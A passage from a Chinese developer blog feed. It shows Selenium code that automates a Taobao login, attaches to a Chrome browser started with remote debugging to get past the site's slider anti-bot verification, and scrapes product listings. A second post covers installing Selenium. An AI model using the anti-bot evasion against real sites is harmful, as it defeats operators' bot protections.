class="line"><span class="comment"># 模拟淘宝登录</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login_taobao</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'开始登录...'</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        login_url=<span class="string">'https://login.taobao.com/member/login.jhtml'</span></span><br><span class="line">        driver.get(login_url)</span><br><span class="line">        input_login_id = wait.until(EC.presence_of_element_located((By.ID, <span class="string">'fm-login-id'</span>)))</span><br><span class="line">        input_login_password = wait.until(EC.presence_of_element_located((By.ID, <span class="string">'fm-login-password'</span>)))</span><br><span class="line">        input_login_id.send_keys(<span class="string">'your account'</span>) <span class="comment"># 用你自己的淘宝账号替换</span></span><br><span class="line">        input_login_password.send_keys(<span class="string">'your password'</span>) <span class="comment"># 用你自己的密码替换</span></span><br><span class="line">        submit = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, <span class="string">'.fm-button.fm-submit.password-login'</span>)))</span><br><span class="line">        submit.click()</span><br><span class="line">        is_loging = wait.until(EC.url_changes(login_url))</span><br><span class="line">        <span class="keyword">return</span> is_loging</span><br><span class="line">    <span class="keyword">except</span> TimeoutException:</span><br><span class="line">        print(<span class="string">'login_taobao TimeoutException'</span>)</span><br><span class="line">        submit = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, <span class="string">'.fm-button.fm-submit'</span>)))</span><br><span class="line">        submit.click()</span><br><span class="line">        is_loging = wait.until(EC.url_changes(login_url))</span><br><span class="line">        <span class="keyword">if</span> is_loging:</span><br><span class="line">            <span class="keyword">return</span> is_loging</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            login_taobao()</span><br><span class="line">            </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    is_loging=login_taobao()</span><br><span class="line">    <span class="keyword">if</span> is_loging:</span><br><span class="line">        print(<span class="string">'已经登录'</span>)</span><br></pre></td></tr></table></figure><p>运行代码后可以看到程序自动的调起了一个Chrome浏览器并访问了淘宝的登录页面，自动的输入了用户淘宝账号和密码，自动的点击了登录按钮，但出现了一个滑动验证的控件，要求滑动验证。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240226/2-%E6%B7%98%E5%AE%9D%E7%99%BB%E5%BD%95%E9%9C%80%E8%A6%81%E6%BB%91%E5%8A%A8%E9%AA%8C%E8%AF%81.png" alt="淘宝登录需要滑动验证"></p><p>人工拖动滑动验证控件，显示验证失败。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240226/3-%E6%B7%98%E5%AE%9D%E7%99%BB%E5%BD%95%E6%BB%91%E5%8A%A8%E9%AA%8C%E8%AF%81%E5%A4%B1%E8%B4%A5.png" alt="淘宝滑动验证失败"></p><p>这是因为淘宝有一套反爬机制识别是否是机器自动在登录。如果是人工打开浏览器，手工输入账号密码登录就不会弹出滑动验证控件进行验证。在网上有很多办法，如可以通过代理修改chormdriver的识别码，这里介绍通过Selenium如何接管已经运行的Chrome浏览器来实现规避淘宝的验证。</p><h3 id="3、Selenium接管已经运行的Chrome浏览器"><a href="#3、Selenium接管已经运行的Chrome浏览器" class="headerlink" title="3、Selenium接管已经运行的Chrome浏览器"></a>3、Selenium接管已经运行的Chrome浏览器</h3><h4 id="1）启动Chrome的远程调试模式"><a href="#1）启动Chrome的远程调试模式" class="headerlink" title="1）启动Chrome的远程调试模式"></a>1）启动Chrome的远程调试模式</h4><p>通过<br><code>chrome.exe --remote-debugging-port=9222 --user-data-dir=&#39;某个存在的文件夹地址&#39;</code>  启动Chrome的远程调试模式，启动一个Chrome浏览器。<br>找到chrome的安装目录，找到chrome.exe ，通过cmd命令行执行上面的命令。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240226/4-%E9%80%9A%E8%BF%87%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E6%A8%A1%E5%BC%8F%E5%90%AF%E5%8A%A8Chrome%E6%B5%8F%E8%A7%88%E5%99%A8.png" alt="启动Chrome远程调试模式"></p><p>运行上面命令后，就会弹出一个chrome浏览器，这个浏览器是可以被Selenium来接管操作的。</p><h4 id="2）代码中实现接管已经运行的Chrome浏览器"><a href="#2）代码中实现接管已经运行的Chrome浏览器" class="headerlink" title="2）代码中实现接管已经运行的Chrome浏览器"></a>2）代码中实现接管已经运行的Chrome浏览器</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium.webdriver <span class="keyword">import</span> Chrome</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.wait <span class="keyword">import</span> WebDriverWait</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support <span class="keyword">import</span> expected_conditions <span class="keyword">as</span> EC</span><br><span class="line"><span class="keyword">from</span> selenium.common <span class="keyword">import</span> TimeoutException</span><br><span class="line"></span><br><span class="line">chrome_options = Options()</span><br><span class="line">chrome_options.add_experimental_option(<span class="string">"debuggerAddress"</span>, <span class="string">"localhost:9222"</span>) <span class="comment">#此处端口保持和命令行启动的端口一致</span></span><br><span class="line">driver = Chrome(options=chrome_options)</span><br><span class="line">wait = WebDriverWait(driver, <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 模拟淘宝登录</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login_taobao</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'开始登录...'</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        login_url=<span class="string">'https://login.taobao.com/member/login.jhtml'</span></span><br><span class="line">        driver.get(login_url)</span><br><span class="line">        input_login_id = wait.until(EC.presence_of_element_located((By.ID, <span class="string">'fm-login-id'</span>)))</span><br><span class="line">        input_login_password = wait.until(EC.presence_of_element_located((By.ID, <span class="string">'fm-login-password'</span>)))</span><br><span class="line">        input_login_id.send_keys(<span class="string">'your account'</span>) <span class="comment"># 用你自己的淘宝账号替换</span></span><br><span class="line">        input_login_password.send_keys(<span class="string">'your password'</span>) <span class="comment"># 用你自己的密码替换</span></span><br><span class="line">        submit = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, <span class="string">'.fm-button.fm-submit.password-login'</span>)))</span><br><span class="line">        submit.click()</span><br><span class="line">        is_loging = wait.until(EC.url_changes(login_url))</span><br><span class="line">        <span class="keyword">return</span> is_loging</span><br><span class="line">    <span class="keyword">except</span> TimeoutException:</span><br><span class="line">        print(<span class="string">'login_taobao TimeoutException'</span>)</span><br><span class="line">        submit = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, <span class="string">'.fm-button.fm-submit'</span>)))</span><br><span class="line">        submit.click()</span><br><span class="line">        is_loging = wait.until(EC.url_changes(login_url))</span><br><span class="line">        <span class="keyword">if</span> is_loging:</span><br><span class="line">            <span class="keyword">return</span> is_loging</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            login_taobao()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    is_loging=login_taobao()</span><br><span class="line">    <span class="keyword">if</span> is_loging:</span><br><span class="line">        print(<span class="string">'已经登录'</span>)</span><br></pre></td></tr></table></figure><h3 id="4、运行效果"><a href="#4、运行效果" class="headerlink" title="4、运行效果"></a>4、运行效果</h3><p>运行上述代码就可以看到，Selenium接管了这个通过Chrome的远程调试模式启动的浏览器，并自动输入用户名和密码，自动登录成功，跳转到我的淘宝界面。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240226/5-%E7%99%BB%E5%BD%95%E6%88%90%E5%8A%9F%E5%88%B0%E6%88%91%E7%9A%84%E6%B7%98%E5%AE%9D.png" alt="自动登录到我的淘宝"></p><h2 id="二、通过Selenium自动爬取淘宝商品信息"><a href="#二、通过Selenium自动爬取淘宝商品信息" class="headerlink" title="二、通过Selenium自动爬取淘宝商品信息"></a>二、通过Selenium自动爬取淘宝商品信息</h2><h3 id="1、分析商品页面"><a href="#1、分析商品页面" class="headerlink" title="1、分析商品页面"></a>1、分析商品页面</h3><p><a href="https://s.taobao.com/search?page=1&amp;q=ipad&amp;tab=all" target="_blank" rel="noopener">https://s.taobao.com/search?page=1&amp;q=ipad&amp;tab=all</a><br>通过Chrome浏览器输入淘宝搜索商品页面链接F12打开开发者工具，分析淘宝搜索商品列表页的源代码，找到商品展示相关源代码包括商品的title、价格、详情页、购买情况等。我们需要通过解析这些源代码获取相应的商品信息。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240226/6-%E5%88%86%E6%9E%90%E6%B7%98%E5%AE%9D%E5%88%97%E8%A1%A8%E9%A1%B5.png" alt="分析商品页面"></p><p>找到下一页翻页的按钮，我们需要控制下一页翻页的按钮来实现自动翻页。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240226/7-%E5%88%86%E6%9E%90%E6%B7%98%E5%AE%9D%E4%B8%8B%E4%B8%80%E9%A1%B5%E6%8C%89%E9%92%AE.png" alt="分析淘宝下一页"></p><h3 id="2、实现商品获取代码"><a href="#2、实现商品获取代码" class="headerlink" title="2、实现商品获取代码"></a>2、实现商品获取代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 解析获取商品信息</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_products</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""提取商品数据"""</span></span><br><span class="line">    html = driver.page_source</span><br><span class="line">    doc = pq(html)</span><br><span class="line">    items = doc(<span class="string">'.Card--doubleCardWrapper--L2XFE73'</span>).items()</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> items:</span><br><span class="line">        product = &#123;<span class="string">'url'</span>: item.attr(<span class="string">'href'</span>),</span><br><span class="line">            <span class="string">'price'</span>: item.find(<span class="string">'.Price--priceInt--ZlsSi_M'</span>).text(),</span><br><span class="line">            <span class="string">'realsales'</span>: item.find(<span class="string">'.Price--realSales--FhTZc7U-cnt'</span>).text(),</span><br><span class="line">            <span class="string">'title'</span>: item.find(<span class="string">'.Title--title--jCOPvpf'</span>).text(),</span><br><span class="line">            <span class="string">'shop'</span>: item.find(<span class="string">'.ShopInfo--TextAndPic--yH0AZfx'</span>).text(),</span><br><span class="line">            <span class="string">'location'</span>: item.find(<span class="string">'.Price--procity--_7Vt3mX'</span>).text()&#125;</span><br><span class="line">        print(product)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 自动获取商品信息并自动翻页</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_page</span><span class="params">(url,cur_page,max_page)</span>:</span></span><br><span class="line">    print(<span class="string">' 正在爬取：'</span>+url)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        driver.get(url)</span><br><span class="line">        get_products()</span><br><span class="line">        next_page_btn = wait.until(EC.element_to_be_clickable((By.XPATH, <span class="string">'//button/span[contains(text(),"下一页")]'</span>)))</span><br><span class="line">        next_page_btn.click()</span><br><span class="line">        do_change = wait.until(EC.url_changes(url))</span><br><span class="line">        <span class="keyword">if</span> do_change <span class="keyword">and</span> cur_page&lt;max_page:</span><br><span class="line">            new_url=driver.current_url</span><br><span class="line">            cur_page = cur_page + <span class="number">1</span></span><br><span class="line">            index_page(new_url,cur_page,max_page)</span><br><span class="line">    <span class="keyword">except</span> TimeoutException:</span><br><span class="line">        print(<span class="string">'---index_page TimeoutException---'</span>)</span><br></pre></td></tr></table></figure><h3 id="3、实现效果"><a href="#3、实现效果" class="headerlink" title="3、实现效果"></a>3、实现效果</h3><p>从浏览器看，Selenium自动访问淘宝登录页，当切到用户名密码登录界面时，Selenium自动输入用户名、密码点击登录。登录成功后，自动访问商品搜索页搜索ipad,进行商信息获取，自动翻下一页。<br>从后台打印的日志看，显示“开始登录”、“已经登录”，正在爬取的链接和该链接下的商品信息。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240226/8-Selenium%E5%90%8E%E5%8F%B0%E6%97%A5%E5%BF%97.png" alt="Selenium后台日志"></p><p>至此，通过Selenium来代码实现模拟登录淘宝并自动爬取商品信息，进行了Selenium的实战。<br>要注意的是：</p><blockquote><p>1、在Selenium打开登录页面后淘宝默认的是扫码登录，需要人为接入切换用户密码模式。这时也可以让Selenium自动去切到用户密码模式登录。代码如下：<br>change_type=wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, ‘.iconfont.icon-password’)))<br>change_type.click() #切换到用户密码模式登录<br>2、在运行启动Chrome的远程调试模式，启动Chrome浏览器后，要关闭其他的Chrome浏览器，保留远程调试模式启动的浏览器就好了。如果是存在多个Chrome浏览器Selenium会不知道要接管哪一个。</p></blockquote><h2 id="附上全部完整代码："><a href="#附上全部完整代码：" class="headerlink" title="附上全部完整代码："></a>附上全部完整代码：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium.webdriver <span class="keyword">import</span> Chrome</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.wait <span class="keyword">import</span> WebDriverWait</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support <span class="keyword">import</span> expected_conditions <span class="keyword">as</span> EC</span><br><span class="line"><span class="keyword">from</span> selenium.common <span class="keyword">import</span> TimeoutException</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">from</span> pyquery <span class="keyword">import</span> PyQuery <span class="keyword">as</span> pq</span><br><span class="line"></span><br><span class="line">chrome_options = Options()</span><br><span class="line">chrome_options.add_experimental_option(<span class="string">"debuggerAddress"</span>, <span class="string">"localhost:9222"</span>) <span class="comment">#此处端口保持和命令行启动的端口一致</span></span><br><span class="line">driver = Chrome(options=chrome_options)</span><br><span class="line">wait = WebDriverWait(driver, <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 模拟淘宝登录</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login_taobao</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'开始登录...'</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        login_url=<span class="string">'https://login.taobao.com/member/login.jhtml'</span></span><br><span class="line">        driver.get(login_url)</span><br><span class="line">        change_type=wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, <span class="string">'.iconfont.icon-password'</span>)))</span><br><span class="line">        change_type.click() <span class="comment">#切换到用户密码模式登录</span></span><br><span class="line">        input_login_id = wait.until(EC.presence_of_element_located((By.ID, <span class="string">'fm-login-id'</span>)))</span><br><span class="line">        input_login_password = wait.until(EC.presence_of_element_located((By.ID, <span class="string">'fm-login-password'</span>)))</span><br><span class="line">        input_login_id.send_keys(<span class="string">'your account'</span>) <span class="comment"># 用你自己的淘宝账号替换</span></span><br><span class="line">        input_login_password.send_keys(<span class="string">'your password'</span>) <span class="comment"># 用你自己的密码替换</span></span><br><span class="line">        submit = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, <span class="string">'.fm-button.fm-submit.password-login'</span>)))</span><br><span class="line">        submit.click()</span><br><span class="line">        is_loging = wait.until(EC.url_changes(login_url))</span><br><span class="line">        <span class="keyword">return</span> is_loging</span><br><span class="line">    <span class="keyword">except</span> TimeoutException:</span><br><span class="line">        print(<span class="string">'login_taobao TimeoutException'</span>)</span><br><span class="line">        submit = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, <span class="string">'.fm-button.fm-submit'</span>)))</span><br><span class="line">        submit.click()</span><br><span class="line">        is_loging = wait.until(EC.url_changes(login_url))</span><br><span class="line">        <span class="keyword">if</span> is_loging:</span><br><span class="line">            <span class="keyword">return</span> is_loging</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            login_taobao()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析获取商品信息</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_products</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""提取商品数据"""</span></span><br><span class="line">    html = driver.page_source</span><br><span class="line">    doc = pq(html)</span><br><span class="line">    items = doc(<span class="string">'.Card--doubleCardWrapper--L2XFE73'</span>).items()</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> items:</span><br><span class="line">        product = &#123;<span class="string">'url'</span>: item.attr(<span class="string">'href'</span>),</span><br><span class="line">            <span class="string">'price'</span>: item.find(<span class="string">'.Price--priceInt--ZlsSi_M'</span>).text(),</span><br><span class="line">            <span class="string">'realsales'</span>: item.find(<span class="string">'.Price--realSales--FhTZc7U-cnt'</span>).text(),</span><br><span class="line">            <span class="string">'title'</span>: item.find(<span class="string">'.Title--title--jCOPvpf'</span>).text(),</span><br><span class="line">            <span class="string">'shop'</span>: item.find(<span class="string">'.ShopInfo--TextAndPic--yH0AZfx'</span>).text(),</span><br><span class="line">            <span class="string">'location'</span>: item.find(<span class="string">'.Price--procity--_7Vt3mX'</span>).text()&#125;</span><br><span class="line">        print(product)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 自动获取商品信息并自动翻页</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_page</span><span class="params">(url,cur_page,max_page)</span>:</span></span><br><span class="line">    print(<span class="string">' 正在爬取：'</span>+url)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        driver.get(url)</span><br><span class="line">        get_products()</span><br><span class="line">        next_page_btn = wait.until(EC.element_to_be_clickable((By.XPATH, <span class="string">'//button/span[contains(text(),"下一页")]'</span>)))</span><br><span class="line">        next_page_btn.click()</span><br><span class="line">        do_change = wait.until(EC.url_changes(url))</span><br><span class="line">        <span class="keyword">if</span> do_change <span class="keyword">and</span> cur_page&lt;max_page:</span><br><span class="line">            new_url=driver.current_url</span><br><span class="line">            cur_page = cur_page + <span class="number">1</span></span><br><span class="line">            index_page(new_url,cur_page,max_page)</span><br><span class="line">    <span class="keyword">except</span> TimeoutException:</span><br><span class="line">        print(<span class="string">'---index_page TimeoutException---'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    is_loging=login_taobao()</span><br><span class="line">    <span class="keyword">if</span> is_loging:</span><br><span class="line">        print(<span class="string">'已经登录'</span>)</span><br><span class="line">        KEYWORD = <span class="string">'iPad'</span></span><br><span class="line">        url = <span class="string">'https://s.taobao.com/search?page=1&amp;q='</span> + quote(KEYWORD) + <span class="string">'&amp;tab=all'</span></span><br><span class="line">        max_page=<span class="number">10</span></span><br><span class="line">        index_page(url,<span class="number">1</span>,max_page)</span><br></pre></td></tr></table></figure><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Selenium安装与配置</title>
      <link href="/posts/8370b2b6/"/>
      <url>/posts/8370b2b6/</url>
      
        <content type="html"><![CDATA[<p>Selenium是一个用于Web应用程序测试的自动化工具。它直接运行在浏览器中，模拟真实用户的操作。Selenium支持多种主流浏览器，如IE、Mozilla Firefox、Safari、Google Chrome、Opera和Edge等。在爬取数据的时候对于需要登录后才能爬取的情况往往可以利用Selenium来进行模拟登录，登录后进行数据的获取。这里先介绍Selenium的安装与配置，实现通过python来驱动浏览器进行操作。</p><h2 id="一、selenium安装"><a href="#一、selenium安装" class="headerlink" title="一、selenium安装"></a>一、selenium安装</h2><p>要安装Selenium，首先需要具备Python开发环境。以下是安装Selenium的步骤：</p><h3 id="1-Python环境准备："><a href="#1-Python环境准备：" class="headerlink" title="1. Python环境准备："></a>1. Python环境准备：</h3><ul><li><p>打开Python官网：<a href="https://www.python.org/downloads/，下载适合你操作系统的Python版本。" target="_blank" rel="noopener">https://www.python.org/downloads/，下载适合你操作系统的Python版本。</a></p></li><li><p>安装Python。在window下安装python环境非常简单，直接下一步下一步就可以安装完成。安装过程中，确保将Python添加到环境变量中，以便在命令行中运行Python命令。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240223/python%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F.png" alt="在这里插入图片描述"></p></li><li><p>安装完成后，可以在命令行中输入<code>python --version</code>来验证Python是否安装成功，并查看版本号。</p></li></ul><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240223/%E6%9F%A5%E7%9C%8Bpython%E7%89%88%E6%9C%AC%E5%8F%B7.png" alt="在这里插入图片描述"></p><h3 id="2-安装Selenium："><a href="#2-安装Selenium：" class="headerlink" title="2. 安装Selenium："></a>2. 安装Selenium：</h3><ul><li>在命令行中，使用pip（Python的包管理工具）来安装Selenium。输入以下命令并按回车键执行：</li><li>如果你的系统有多个Python版本，可能需要使用pip3代替pip。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install selenium</span><br></pre></td></tr></table></figure><h3 id="3-浏览器驱动安装："><a href="#3-浏览器驱动安装：" class="headerlink" title="3. 浏览器驱动安装："></a>3. 浏览器驱动安装：</h3><ul><li>Selenium支持多种浏览器，但每种浏览器都需要相应的驱动程序。例如，对于Chrome浏览器，你需要下载ChromeDriver。<br>○ 访问ChromeDriver的下载页面：<a href="https://sites.google.com/a/chromium.org/chromedriver/，选择与你的Chrome浏览器版本相对应的ChromeDriver版本。" target="_blank" rel="noopener">https://sites.google.com/a/chromium.org/chromedriver/，选择与你的Chrome浏览器版本相对应的ChromeDriver版本。</a><br>○ 国内镜像下载站点 <a href="https://registry.npmmirror.com/binary.html?path=chromedriver/" target="_blank" rel="noopener">https://registry.npmmirror.com/binary.html?path=chromedriver/</a><br> 高版本的ChromeDriver可以在<a href="https://chromedriver.com/download" target="_blank" rel="noopener">https://chromedriver.com/download</a> 下载</li><li>下载后，解压（如果需要的话），并将ChromeDriver的路径添加到系统环境变量中，或者将其放在你的项目目录中。比如我的是放到 C:\python\Scripts 并将C:\python\Scripts配置到了系统环境变量中。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240223/%E5%B0%86ChromeDriver%E6%94%BE%E5%85%A5%E7%B3%BB%E7%BB%9F%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F.png" alt="在这里插入图片描述"></li></ul><h3 id="4-验证安装："><a href="#4-验证安装：" class="headerlink" title="4. 验证安装："></a>4. 验证安装：</h3><p> 参考selenium的官方文档，创建一个简单的Python脚本，使用Selenium打开浏览器并访问一个网页。<br>  运行这个脚本。如果一切顺利，它会打开Chrome浏览器并导航到指定的URL，然后关闭浏览器。<br><strong>代码如下：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"></span><br><span class="line">driver = webdriver.Chrome()</span><br><span class="line"></span><br><span class="line">driver.get(<span class="string">"https://www.selenium.dev/selenium/web/web-form.html"</span>)</span><br><span class="line"></span><br><span class="line">title = driver.title</span><br><span class="line"></span><br><span class="line">driver.implicitly_wait(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">text_box = driver.find_element(by=By.NAME, value=<span class="string">"my-text"</span>)</span><br><span class="line">submit_button = driver.find_element(by=By.CSS_SELECTOR, value=<span class="string">"button"</span>)</span><br><span class="line"></span><br><span class="line">text_box.send_keys(<span class="string">"Selenium"</span>)</span><br><span class="line">submit_button.click()</span><br><span class="line"></span><br><span class="line">message = driver.find_element(by=By.ID, value=<span class="string">"message"</span>)</span><br><span class="line">text = message.text</span><br><span class="line"></span><br><span class="line">driver.quit()</span><br></pre></td></tr></table></figure><p><strong>效果如下：</strong><br>打开一个浏览器，访问<a href="https://www.selenium.dev/selenium/web/web-form.html" target="_blank" rel="noopener">https://www.selenium.dev/selenium/web/web-form.html</a><br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240223/%E9%80%9A%E8%BF%87selenium%E9%A9%B1%E5%8A%A8%E6%89%93%E5%BC%80%E6%B5%8F%E8%A7%88%E5%99%A8.png" alt="在这里插入图片描述"></p><p>对浏览器中的元素进行操作，最后关闭浏览器。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240223/%E9%80%9A%E8%BF%87selenium%E5%AF%B9%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%85%83%E7%B4%A0%E8%BF%9B%E8%A1%8C%E6%93%8D%E4%BD%9C.png" alt="在这里插入图片描述"></p><blockquote><p>请注意，由于Selenium和浏览器驱动程序可能会定期更新，因此在安装和配置过程中，最好参考最新的官方文档和指南。</p></blockquote><h2 id="二、常见问题"><a href="#二、常见问题" class="headerlink" 